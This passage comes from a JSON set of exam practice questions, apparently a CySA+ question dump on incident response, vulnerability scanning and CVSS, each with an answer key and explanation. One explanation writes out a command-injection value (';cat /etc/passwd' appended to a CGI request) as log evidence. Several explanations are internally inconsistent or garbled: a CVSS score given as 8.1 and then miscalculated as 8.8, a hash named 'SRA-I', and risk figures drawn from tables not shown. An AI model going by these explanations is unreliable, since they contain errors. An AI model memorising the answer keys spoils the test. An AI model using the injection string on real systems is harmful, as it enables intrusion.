    "explanation": "The next action that the CSIRT should conduct after isolating the compromised server from the\nnetwork is to take a snapshot of the compromised server and verify its integrity. Taking a snapshot of\nthe compromised server involves creating an exact copy or image of the server’s data and state at a\nspecific point in time. Verifying its integrity involves ensuring that the snapshot has not been altered,\ncorrupted, or tampered with during or after its creation. Taking a snapshot and verifying its integrity\ncan help preserve and protect any evidence or information related to the incident, as well as prevent\nany tampering, contamination, or destruction of evidence.",
    "image": null
  },
  {
    "id": "q-jc-63",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "During an incident, an analyst needs to acquire evidence for later investigation. Which of the\nfollowing must be collected first in a computer system, related to its volatility level?",
    "options": [
      "A. Disk contents",
      "B. Backup data",
      "C. Temporary files",
      "D. Running processes"
    ],
    "answer": "D",
    "explanation": "The most volatile type of evidence that must be collected first in a computer system is running\nprocesses. Running processes are programs or applications that are currently executing on a\ncomputer system and using its resources, such as memory, CPU, disk space, or network bandwidth.\nRunning processes are very volatile because they can change rapidly or disappear completely when\nthe system is shut down, rebooted, logged off, or crashed. Running processes can also be affected by\nother processes or users that may modify or terminate them. Therefore, running processes must be\ncollected first before any other type of evidence in a computer system",
    "image": null
  },
  {
    "id": "q-jc-64",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A security analyst is trying to identify possible network addresses from different source networks\nbelonging to the same company and region. Which of the following shell script functions could help\nachieve the goal?",
    "options": [
      "A. function w() { a=$(ping -c 1 $1 | awk-F ”/” ’END{print $1}’) && echo “$1 | $a” }",
      "B. function x() { b=traceroute -m 40 $1 | awk ’END{print $1}’) && echo “$1 | $b” }",
      "C. function y() { dig $(dig -x $1 | grep PTR | tail -n 1 | awk -F ”.in-addr” ’{print\n$1}’).origin.asn.cymru.com TXT +short }",
      "D. function z() { c=$(geoiplookup$1) && echo “$1 | $c” }"
    ],
    "answer": "C",
    "explanation": "The shell script function that could help identify possible network addresses from different source\nnetworks belonging to the same company and region is:\nfunction y() { dig $(dig -x $1 | grep PTR | tail -n 1 | awk -F ”.in-addr” ’{print\n$1}’).origin.asn.cymru.com TXT +short }\nThis function takes an IP address as an argument and performs two DNS lookups using the dig\ncommand. The first lookup uses the -x option to perform a reverse DNS lookup and get the hostname\nassociated with the IP address. The second lookup uses the origin.asn.cymru.com domain to get the\nautonomous system number (ASN) and other information related to the IP address, such as the\ncountry code, registry, or allocation date. The function then prints the IP address and the ASN\ninformation, which can help identify any network addresses that belong to the same ASN or region",
    "image": "images/page_37_img_2.jpeg"
  },
  {
    "id": "q-jc-65",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A security analyst is writing a shell script to identify IP addresses from the same country. Which of\nthe following functions would help the analyst achieve the objective?",
    "options": [
      "A. function w() { info=$(ping -c 1 $1 | awk -F “/” ‘END{print $1}’) && echo “$1 | $info” }",
      "B. function x() { info=$(geoiplookup $1) && echo “$1 | $info” }",
      "C. function y() { info=$(dig -x $1 | grep PTR | tail -n 1 ) && echo “$1 | $info” }",
      "D. function z() { info=$(traceroute -m 40 $1 | awk ‘END{print $1}’) && echo “$1 | $info” }"
    ],
    "answer": "B",
    "explanation": "The function that would help the analyst identify IP addresses from the same country is:\nfunction x() { info=$(geoiplookup $1) && echo “$1 | $info” }\nThis function takes an IP address as an argument and uses the geoiplookup command to get the\ngeographic location information associated with the IP address, such as the country name, country\ncode, region, city, or latitude and longitude. The function then prints the IP address and the\ngeographic location information, which can help identify any IP addresses that belong to the same\ncountry.",
    "image": "images/page_37_img_2.jpeg"
  },
  {
    "id": "q-jc-66",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A security analyst obtained the following table of results from a recent vulnerability assessment that\nwas conducted against a single web server in the environment:\nWhich of the following should be completed first to remediate the findings?",
    "options": [
      "A. Ask the web development team to update the page contents",
      "B. Add the IP address allow listing for control panel access",
      "C. Purchase an appropriate certificate from a trusted root CA",
      "D. Perform proper sanitization on all fields"
    ],
    "answer": "D",
    "explanation": "The first action that should be completed to remediate the findings is to perform proper sanitization\non all fields. Sanitization is a process that involves validating, filtering, or encoding any user input or\ndata before processing or storing it on a system or application. Sanitization can help prevent various\ntypes of attacks, such as cross-site scripting (XSS), SQL injection, or command injection, that exploit\nunsanitized input or data to execute malicious scripts, commands, or queries on a system or\napplication. Performing proper sanitization on all fields can help address the most critical and\ncommon vulnerability found during the vulnerability assessment, which is XSS.",
    "image": "images/page_37_img_2.jpeg"
  },
  {
    "id": "q-jc-67",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A SOC analyst identifies the following content while examining the output of a debugger command\nover a client-server application:\ngetconnection (database01, \"alpha \" , \"AXTV. 127GdCx94GTd\") ;\nWhich of the following is the most likely vulnerability in this system?",
    "options": [
      "A. Lack of input validation",
      "B. SQL injection",
      "C. Hard-coded credential",
      "D. Buffer overflow attacks"
    ],
    "answer": "C",
    "explanation": "The most likely vulnerability in this system is hard-coded credential. Hard-coded credential is a\npractice of embedding or storing a username, password, or other sensitive information in the source\ncode or configuration file of a system or application. Hard-coded credential can pose a serious\nsecurity risk, as it can expose the system or application to unauthorized access, data theft, or\ncompromise if the credential is discovered or leaked by an attacker. Hard-coded credential can also\nmake it difficult to change or update the credential if needed, as it may require modifying the code\nor file and redeploying the system or application.",
    "image": "images/page_37_img_2.jpeg"
  },
  {
    "id": "q-jc-68",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A company receives a penetration test report summary from a third party. The report summary\nindicates a proxy has some patches that need to be applied. The proxy is sitting in a rack and is not\nbeing\nused, as the company has replaced it with a new one. The CVE score of the vulnerability on the proxy\nis a 9.8. Which of the following best practices should the company follow with this proxy?",
    "options": [
      "A. Leave the proxy as is.",
      "B. Decomission the proxy.",
      "C. Migrate the proxy to the cloud.",
      "D. Patch the proxy"
    ],
    "answer": "B",
    "explanation": "The best practice that the company should follow with this proxy is to decommission the proxy.\nDecommissioning the proxy involves removing or disposing of the proxy from the rack and the\nnetwork, as well as deleting or wiping any data or configuration on the proxy. Decommissioning the\nproxy can help eliminate the vulnerability on the proxy, as well as reduce the attack surface,\ncomplexity, or cost of maintaining the network. Decommissioning the proxy can also free up space or\nresources for other devices or systems that are in use or needed by the company.",
    "image": "images/page_39_img_2.jpeg"
  },
  {
    "id": "q-jc-69",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A zero-day command injection vulnerability was published. A security administrator is analyzing the\nfollowing logs for evidence of adversaries attempting to exploit the vulnerability:\nWhich of the following log entries provides evidence of the attempted exploit?",
    "options": [
      "A. Log entry 1",
      "B. Log entry 2",
      "C. Log entry 3",
      "D. Log entry 4"
    ],
    "answer": "D",
    "explanation": "Log entry 4 shows an attempt to exploit the zero-day command injection vulnerability by appending\na malicious command (;cat /etc/passwd) to the end of a legitimate request (/cgi-\nbin/index.cgi?name=John). This command would try to read the contents of the /etc/passwd file,\nwhich contains user account information, and could lead to further compromise of the system. The\nother log entries do not show any signs of command injection, as they do not contain any special\ncharacters or commands that could alter the intended behavior of the application. Official Reference:\nhttps://www.imperva.com/learn/application-security/command-injection/\nhttps://www.zerodayinitiative.com/advisories/published/",
    "image": "images/page_39_img_2.jpeg"
  },
  {
    "id": "q-jc-70",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Which of the following is the most important factor to ensure accurate incident response reporting?",
    "options": [
      "A. A well-defined timeline of the events",
      "B. A guideline for regulatory reporting",
      "C. Logs from the impacted system",
      "D. A well-developed executive summary"
    ],
    "answer": "A",
    "explanation": "A well-defined timeline of the events is the most important factor to ensure accurate incident\nresponse reporting, as it provides a clear and chronological account of what happened, when it\nhappened, who was involved, and what actions were taken. A timeline helps to identify the root\ncause of the incident, the impact and scope of the damage, the effectiveness of the response, and\nthe lessons learned for future improvement. A timeline also helps to communicate the incident to\nrelevant stakeholders, such as management, legal, regulatory, or media entities. The other factors\nare also important for incident response reporting, but they are not as essential as a well-defined\ntimeline. Official Reference:\nhttps://www.ibm.com/topics/incident-response\nhttps://www.crowdstrike.com/cybersecurity-101/incident-response/incident-response-steps/",
    "image": "images/page_39_img_2.jpeg"
  },
  {
    "id": "q-jc-71",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A cybersecurity analyst notices unusual network scanning activity coming from a country that the\ncompany does not do business with. Which of the following is the best mitigation technique?",
    "options": [
      "A. Geoblock the offending source country",
      "B. Block the IP range of the scans at the network firewall.",
      "C. Perform a historical trend analysis and look for similar scanning activity.",
      "D. Block the specific IP address of the scans at the network firewall"
    ],
    "answer": "A",
    "explanation": "Geoblocking is the best mitigation technique for unusual network scanning activity coming from a\ncountry that the company does not do business with, as it can prevent any potential attacks or data\nbreaches from that country. Geoblocking is the practice of restricting access to websites or services\nbased on geographic location, usually by blocking IP addresses associated with a certain country or\nregion. Geoblocking can help reduce the overall attack surface and protect against malicious actors\nwho may be trying to exploit vulnerabilities or steal information. The other options are not as\neffective as geoblocking, as they may not block all the possible sources of the scanning activity, or\nthey may not address the root cause of the problem. Official Reference:\nhttps://www.blumira.com/geoblocking/\nhttps://www.avg.com/en/signal/geo-blocking",
    "image": "images/page_41_img_2.jpeg"
  },
  {
    "id": "q-jc-72",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "An employee is suspected of misusing a company-issued laptop. The employee has been suspended\npending an investigation by human resources. Which of the following is the best step to preserve\nevidence?",
    "options": [
      "A. Disable the user's network account and access to web resources",
      "B. Make a copy of the files as a backup on the server.",
      "C. Place a legal hold on the device and the user's network share.",
      "D. Make a forensic image of the device and create a SRA-I hash."
    ],
    "answer": "D",
    "explanation": "Making a forensic image of the device and creating a SRA-I hash is the best step to preserve\nevidence, as it creates an exact copy of the device’s data and verifies its integrity. A forensic image is\na bit-by-bit copy of the device’s storage media, which preserves all the information on the device,\nincluding deleted or hidden files. A SRA-I hash is a cryptographic value that is calculated from the\nforensic image, which can be used to prove that the image has not been altered or tampered with.\nThe other options are not as effective as making a forensic image and creating a SRA-I hash, as they\nmay not capture all the relevant data, or they may not provide sufficient verification of the\nevidence’s authenticity. Official Reference:\nhttps://www.sans.org/blog/forensics-101-acquiring-an-image-with-ftk-imager/\nhttps://swailescomputerforensics.com/digital-forensics-imaging-hash-value/",
    "image": "images/page_41_img_2.jpeg"
  },
  {
    "id": "q-jc-73",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "Patches for two highly exploited vulnerabilities were released on the same Friday afternoon.\nInformation about the systems and vulnerabilities is shown in the tables below:\nWhich of the following should the security analyst prioritize for remediation?",
    "options": [
      "A. rogers",
      "B. brady",
      "C. brees",
      "D. manning"
    ],
    "answer": "B",
    "explanation": "Brady should be prioritized for remediation, as it has the highest risk score and the highest number\nof affected users. The risk score is calculated by multiplying the CVSS score by the exposure factor,\nwhich is the percentage of systems that are vulnerable to the exploit. Brady has a risk score of 9 x 0.8\n= 7.2, which is higher than any other system. Brady also has 500 affected users, which is more than\nany other system. Therefore, patching brady would reduce the most risk and impact for the\norganization. The other systems have lower risk scores and lower numbers of affected users, so they\ncan be remediated later.",
    "image": "images/page_41_img_2.jpeg"
  },
  {
    "id": "q-jc-74",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A security analyst is validating a particular finding that was reported in a web application\nvulnerability scan to make sure it is not a false positive. The security analyst uses the snippet below:\nWhich of the following vulnerability types is the security analyst validating?",
    "options": [
      "A. Directory traversal",
      "B. XSS",
      "C. XXE",
      "D. SSRF"
    ],
    "answer": "B",
    "explanation": "XSS (cross-site scripting) is the vulnerability type that the security analyst is validating, as the snippet\nshows an attempt to inject a script tag into the web application. XSS is a web security vulnerability\nthat allows an attacker to execute arbitrary JavaScript code in the browser of another user who visits\nthe vulnerable website. XSS can be used to perform various malicious actions, such as stealing\ncookies, session hijacking, phishing, or defacing websites. The other vulnerability types are not\nrelevant to the snippet, as they involve different kinds of attacks. Directory traversal is an attack that\nallows an attacker to access files and directories that are outside of the web root folder. XXE (XML\nexternal entity) injection is an attack that allows an attacker to interfere with an application’s\nprocessing of XML data, and potentially access files or systems. SSRF (server-side request forgery) is\nan attack that allows an attacker to induce the server-side application to make requests to an\nunintended location. Official Reference:\nhttps://portswigger.net/web-security/xxe\nhttps://portswigger.net/web-security/ssrf\nhttps://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_\nSheet.html",
    "image": "images/page_42_img_2.jpeg"
  },
  {
    "id": "q-jc-75",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "During a cybersecurity incident, one of the web servers at the perimeter network was affected by\nransomware. Which of the following actions should be performed immediately?",
    "options": [
      "A. Shut down the server.",
      "B. Reimage the server",
      "C. Quarantine the server",
      "D. Update the OS to latest version."
    ],
    "answer": "C",
    "explanation": "Quarantining the server is the best action to perform immediately, as it isolates the affected server\nfrom the rest of the network and prevents the ransomware from spreading to other systems or data.\nQuarantining the server also preserves the evidence of the ransomware attack, which can be useful\nfor forensic analysis and law enforcement investigation. The other actions are not as urgent as\nquarantining the server, as they may not stop the ransomware infection, or they may destroy\nvaluable evidence. Shutting down the server may not remove the ransomware, and it may trigger a\ndata deletion mechanism by the ransomware. Reimaging the server may restore its functionality, but\nit will also erase any traces of the ransomware and make recovery of encrypted data impossible.\nUpdating the OS to the latest version may fix some vulnerabilities, but it will not remove the\nransomware or decrypt the data. Official Reference:\nhttps://www.cisa.gov/stopransomware/ransomware-guide\nhttps://www.cisa.gov/sites/default/files/publications/Ransomware_Executive_One-\nPager_and_Technical_Document-FINAL.pdf\nhttps://www.cisa.gov/stopransomware/ive-been-hit-ransomware",
    "image": null
  },
  {
    "id": "q-jc-76",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A security analyst is performing vulnerability scans on the network. The analyst installs a scanner\nappliance, configures the subnets to scan, and begins the scan of the network. Which of the\nfollowing\nwould be missing from a scan performed with this configuration?",
    "options": [
      "A. Operating system version",
      "B. Registry key values",
      "C. Open ports",
      "D. IP address"
    ],
    "answer": "B",
    "explanation": "Registry key values would be missing from a scan performed with this configuration, as the scanner\nappliance would not have access to the Windows Registry of the scanned systems. The Windows\nRegistry is a database that stores configuration settings and options for the operating system and\ninstalled applications. To scan the Registry, the scanner would need to have credentials to log in to\nthe systems and run a local agent or script. The other items would not be missing from the scan, as\nthey can be detected by the scanner appliance without credentials. Operating system version can be\nidentified by analyzing service banners or fingerprinting techniques. Open ports can be discovered by\nperforming a port scan or sending probes to common ports. IP address can be obtained by resolving\nthe hostname or using network discovery tools. https://attack.mitre.org/techniques/T1112/",
    "image": null
  },
  {
    "id": "q-jc-77",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A security administrator has been notified by the IT operations department that some vulnerability\nreports contain an incomplete list of findings. Which of the following methods should be used to\nresolve\nthis issue?",
    "options": [
      "A. Credentialed scan",
      "B. External scan",
      "C. Differential scan",
      "D. Network scan"
    ],
    "answer": "A",
    "explanation": "A credentialed scan is a type of vulnerability scan that uses valid credentials to log in to the scanned\nsystems and perform a more thorough and accurate assessment of their vulnerabilities. A\ncredentialed scan can access more information than a non-credentialed scan, such as registry keys,\npatch levels, configuration settings, and installed applications. A credentialed scan can also reduce\nthe number of false positives and false negatives, as it can verify the actual state of the system rather\nthan relying on inference or assumptions. The other types of scans are not related to the issue of\nincomplete findings, as they refer to different aspects of vulnerability scanning, such as the scope,\nlocation, or frequency of the scan. An external scan is a scan that is performed from outside the\nnetwork perimeter, usually from the internet. An external scan can reveal how an attacker would see\nthe network and what vulnerabilities are exposed to the public. An external scan cannot access\ninternal systems or resources that are behind firewalls or other security controls. A differential scan is\na scan that compares the results of two scans and highlights the differences between them. A\ndifferential scan can help identify changes in the network environment, such as new vulnerabilities,\npatched vulnerabilities, or new devices. A differential scan does not provide a complete list of\nfindings by itself, but rather a summary of changes. A network scan is a scan that focuses on the\nnetwork layer of the OSI model and detects vulnerabilities related to network devices, protocols,\nservices, and configurations. A network scan can discover open ports, misconfigured firewalls,\nunencrypted traffic, and other network-related issues. A network scan does not provide information\nabout the application layer or the host layer of the OSI model, such as web applications or operating\nsystems.",
    "image": null
  },
  {
    "id": "q-jc-78",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A cybersecurity analyst is reviewing SIEM logs and observes consistent requests originating from an\ninternal host to a blocklisted external server. Which of the following best describes the activity that is\ntaking place?",
    "options": [
      "A. Data exfiltration",
      "B. Rogue device",
      "C. Scanning",
      "D. Beaconing"
    ],
    "answer": "D",
    "explanation": "Beaconing is the best term to describe the activity that is taking place, as it refers to the periodic\ncommunication between an infected host and a blocklisted external server. Beaconing is a common\ntechnique used by malware to establish a connection with a command-and-control (C2) server, which\ncan provide instructions, updates, or exfiltration capabilities to the malware. Beaconing can vary in\nfrequency, duration, and payload, depending on the type and sophistication of the malware. The\nother terms are not as accurate as beaconing, as they describe different aspects of malicious activity.\nData exfiltration is the unauthorized transfer of data from a compromised system to an external\ndestination, such as a C2 server or a cloud storage service. Data exfiltration can be a goal or a\nconsequence of malware infection, but it does not necessarily involve blocklisted servers or\nconsistent requests. Rogue device is a device that is connected to a network without authorization or\nproper security controls. Rogue devices can pose a security risk, as they can introduce malware,\nbypass firewalls, or access sensitive data. However, rogue devices are not necessarily infected with\nmalware or communicating with blocklisted servers. Scanning is the process of probing a network or\na system for vulnerabilities, open ports, services, or other information. Scanning can be performed\nby legitimate administrators or malicious actors, depending on the intent and authorization.\nScanning does not imply consistent requests or blocklisted servers, as it can target any network or\nsystem.",
    "image": "images/page_46_img_2.jpeg"
  },
  {
    "id": "q-jc-79",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 4.0: Reporting and Communication",
    "question": "A technician is analyzing output from a popular network mapping tool for a PCI audit:\nWhich of the following best describes the output?",
    "options": [
      "A. The host is not up or responding.",
      "B. The host is running excessive cipher suites.",
      "C. The host is allowing insecure cipher suites.",
      "D. The Secure Shell port on this host is closed"
    ],
    "answer": "C",
    "explanation": "The output shows the result of running the ssl-enum-ciphers script with Nmap, which is a tool that\ncan scan web servers for supported SSL/TLS cipher suites. Cipher suites are combinations of\ncryptographic algorithms that are used to establish secure communication between a client and a\nserver. The output shows the cipher suites that are supported by the server, along with a letter grade\n(A through F) indicating the strength of the connection. The output also shows the least strength,\nwhich is the strength of the weakest cipher offered by the server. In this case, the least strength is F,\nwhich means that the server is allowing insecure cipher suites that are vulnerable to attacks or have\nbeen deprecated. For example, the output shows that the server supports SSLv3, which is an\noutdated and insecure protocol that is susceptible to the POODLE attack. The output also shows that\nthe server supports RC4, which is a weak and broken stream cipher that should not be used.\nTherefore, the best description of the output is that the host is allowing insecure cipher suites. The\nother descriptions are not accurate, as they do not reflect what the output shows. The host is not up\nor responding is incorrect, as the output clearly shows that the host is up and responding to the scan.\nThe host is running excessive cipher suites is incorrect, as the output does not indicate how many\ncipher suites the host is running, only which ones it supports. The Secure Shell port on this host is\nclosed is incorrect, as the output does not show anything about port 22, which is the default port for\nSecure Shell (SSH). The output only shows information about port 443, which is the default port for\nHTTPS.",
    "image": "images/page_46_img_2.jpeg"
  },
  {
    "id": "q-jc-80",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A security analyst performs a vulnerability scan. Based on the metrics from the scan results, the\nanalyst must prioritize which hosts to patch. The analyst runs the tool and receives the following\noutput:\nWhich of the following hosts should be patched first, based on the metrics?",
    "options": [
      "A. host01",
      "B. host02",
      "C. host03",
      "D. host04"
    ],
    "answer": "C",
    "explanation": "Host03 should be patched first, based on the metrics, as it has the highest risk score and the highest\nnumber of critical vulnerabilities. The risk score is calculated by multiplying the CVSS score by the\nexposure factor, which is the percentage of systems that are vulnerable to the exploit. Host03 has a\nrisk score of 10 x 0.9 = 9, which is higher than any other host. Host03 also has 5 critical\nvulnerabilities, which are the most severe and urgent to fix, as they can allow remote code\nexecution, privilege escalation, or data loss. The other hosts have lower risk scores and lower\nnumbers of critical vulnerabilities, so they can be patched later.",
    "image": "images/page_47_img_2.jpeg"
  },
  {
    "id": "q-jc-81",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A systems analyst is limiting user access to system configuration keys and values in a Windows\nenvironment. Which of the following describes where the analyst can find these configuration items?",
    "options": [
      "A. config. ini",
      "B. ntds.dit",
      "C. Master boot record",
      "D. Registry"
    ],
    "answer": "D",
    "explanation": "The correct answer is D. Registry.\nThe registry is a database that stores system configuration keys and values in a Windows\nenvironment. The registry contains information about the hardware, software, users, and\npreferences of the system. The registry can be accessed and modified using the Registry Editor tool\n(regedit.exe) or the command-line tool (reg.exe). The registry is organized into five main sections,\ncalled hives, which are further divided into subkeys and values.\nThe other options are not the best descriptions of where the analyst can find system configuration\nkeys and values in a Windows environment. config.ini (A) is a file that stores configuration settings\nfor some applications, but it is not a database that stores system configuration keys and values.\nntds.dit (B) is a file that stores the Active Directory data for a domain controller, but it is not a\ndatabase that stores system configuration keys and values. Master boot record © is a section of the\nhard disk that contains information about the partitions and the boot loader, but it is not a database\nthat stores system configuration keys and values.",
    "image": null
  },
  {
    "id": "q-jc-82",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A security analyst needs to ensure that systems across the organization are protected based on the\nsensitivity of the content each system hosts. The analyst is working with the respective system\nowners to help determine the best methodology that seeks to promote confidentiality, availability,\nand integrity of the data being hosted. Which of the following should the security analyst perform\nfirst to\ncategorize and prioritize the respective systems?",
    "options": [
      "A. Interview the users who access these systems,",
      "B. Scan the systems to see which vulnerabilities currently exist.",
      "C. Configure alerts for vendor-specific zero-day exploits.",
      "D. Determine the asset value of each system."
    ],
    "answer": "D",
    "explanation": "Determining the asset value of each system is the best action to perform first, as it helps to\ncategorize and prioritize the systems based on the sensitivity of the data they host. The asset value is\na measure of how important a system is to the organization, in terms of its financial, operational, or\nreputational impact. The asset value can help the security analyst to assign a risk level and a\nprotection level to each system, and to allocate resources accordingly. The other actions are not as\neffective as determining the asset value, as they do not directly address the goal of promoting\nconfidentiality, availability, and integrity of the data. Interviewing the users who access these\nsystems may provide some insight into how the systems are used and what data they contain, but it\nmay not reflect the actual value or sensitivity of the data from an organizational perspective.\nScanning the systems to see which vulnerabilities currently exist may help to identify and remediate\nsome security issues, but it does not help to categorize or prioritize the systems based on their data\nsensitivity. Configuring alerts for vendor-specific zero-day exploits may help to detect and respond to\nsome emerging threats, but it does not help to protect the systems based on their data sensitivity.",
    "image": null
  },
  {
    "id": "q-jc-83",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A security analyst reviews the latest vulnerability scans and observes there are vulnerabilities with\nsimilar CVSSv3 scores but different base score metrics. Which of the following attack vectors should\nthe analyst remediate first?",
    "options": [
      "A. CVSS 3.0/AVP/AC:L/PR:L/UI:N/S U/C:H/I:H/A:H",
      "B. CVSS 3.0/AV:A/AC .L/PR:L/UI:N/S:U/C:H/I:H/A:H",
      "C. CVSS 3.0/AV:N/AC:L/PR:L/UI:N/S;U/C:H/I:H/A:H",
      "D. CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
    ],
    "answer": "C",
    "explanation": "CVSS 3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H is the attack vector that the analyst should\nremediate first, as it has the highest CVSSv3 score of 8.1. CVSSv3 (Common Vulnerability Scoring\nSystem version 3) is a standard framework for rating the severity of vulnerabilities, based on various\nmetrics that reflect the characteristics and impact of the vulnerability. The CVSSv3 score is calculated\nfrom three groups of metrics: Base, Temporal, and Environmental. The Base metrics are mandatory\nand reflect the intrinsic qualities of the vulnerability, such as how it can be exploited, what privileges\nare required, and what impact it has on confidentiality, integrity, and availability. The Temporal\nmetrics are optional and reflect the current state of the vulnerability, such as whether there is a\nknown exploit, a patch, or a workaround. The Environmental metrics are also optional and reflect the\ncontext of the vulnerability in a specific environment, such as how it affects the asset value, security\nrequirements, or mitigating controls. The Base metrics produce a score ranging from 0 to 10, which\ncan then be modified by scoring the Temporal and Environmental metrics. A CVSS score is also\nrepresented as a vector string, a compressed textual representation of the values used to derive the\nscore.\nThe attack vector in question has the following Base metrics:\nAttack Vector (AV): Network (N). This means that the vulnerability can be exploited remotely over a\nnetwork connection.\nAttack Complexity (AC): Low (L). This means that the attack does not require any special conditions or\nchanges to the configuration of the target system.\nPrivileges Required (PR): Low (L). This means that the attacker needs some privileges on the target\nsystem to exploit the vulnerability, such as user-level access.\nUser Interaction (UI): None (N). This means that the attack does not require any user action or\ninvolvement to succeed.\nScope (S): Unchanged (U). This means that the impact of the vulnerability is confined to the same\nsecurity authority as the vulnerable component, such as an application or an operating system.\nConfidentiality Impact ©: High (H). This means that the vulnerability results in a total loss of\nconfidentiality, such as unauthorized disclosure of all data on the system.\nIntegrity Impact (I): High (H). This means that the vulnerability results in a total loss of integrity, such\nas unauthorized modification or deletion of all data on the system.\nAvailability Impact (A): High (H). This means that the vulnerability results in a total loss of availability,\nsuch as denial of service or system crash.\nUsing these metrics, we can calculate the Base score using this formula:\nBase Score = Roundup(Minimum[(Impact + Exploitability), 10])\nWhere:\nImpact = 6.42 x [1 - ((1 - Confidentiality) x (1 - Integrity) x (1 - Availability))]\nExploitability = 8.22 x Attack Vector x Attack Complexity x Privileges Required x User Interaction\nUsing this formula, we get:\nImpact = 6.42 x [1 - ((1 - 0.56) x (1 - 0.56) x (1 - 0.56))] = 5.9\nExploitability = 8.22 x 0.85 x 0.77 x 0.62 x 0.85 = 2.8\nBase Score = Roundup(Minimum[(5.9 + 2.8), 10]) = Roundup(8.7) = 8.8\nTherefore, this attack vector has a Base score of 8.8, which is higher than any other option.\nThe other attack vectors have lower Base scores, as they have different values for some of the Base\nmetrics:\nCVSS:3.0/AV:P/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H has a Base score of 6.2, as it has a lower value for\nAttack Vector (Physical), which means that the vulnerability can only be exploited by having physical\naccess to the target system.\nCVSS:3.0/AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H has a Base score of 7.4, as it has a lower value for\nAttack Vector (Adjacent Network), which means that the vulnerability can only be exploited by being\non the same physical or logical network as the target system.\nCVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H has a Base score of 6.8, as it has a lower value for\nAttack Vector (Local), which means that the vulnerability can only be exploited by having local access\nto the target system, such as through a terminal or a command shell.",
    "image": null
  },
  {
    "id": "q-jc-84",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "After identifying a threat, a company has decided to implement a patch management program to\nremediate vulnerabilities. Which of the following risk management principles is the company\nexercising?",
    "options": [
      "A. Transfer",
      "B. Accept",
      "C. Mitigate",
      "D. Avoid"
    ],
    "answer": "C",
    "explanation": "Mitigate is the best term to describe the risk management principle that the company is exercising,\nas it means to reduce the likelihood or impact of a risk. By implementing a patch management\nprogram to remediate vulnerabilities, the company is mitigating the threat of cyberattacks that could\nexploit those vulnerabilities and compromise the security or functionality of the systems. The other\nterms are not as accurate as mitigate, as they describe different risk management principles. Transfer\nmeans to shift the responsibility or burden of a risk to another party, such as an insurer or a\ncontractor. Accept means to acknowledge the existence of a risk and decide not to take any action to\nreduce it, usually because the risk is low or the cost of mitigation is too high. Avoid means to\neliminate the possibility of a risk by changing the plans or activities that could cause it, such as\ncancelling a project or discontinuing a service.",
    "image": null
  },
  {
    "id": "q-jc-85",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A security analyst discovers an ongoing ransomware attack while investigating a phishing email. The\nanalyst downloads a copy of the file from the email and isolates the affected workstation from the\nnetwork. Which of the following activities should the analyst perform next?",
    "options": [
      "A. Wipe the computer and reinstall software",
      "B. Shut down the email server and quarantine it from the network.",
      "C. Acquire a bit-level image of the affected workstation.",
      "D. Search for other mail users who have received the same file."
    ],
    "answer": "D",
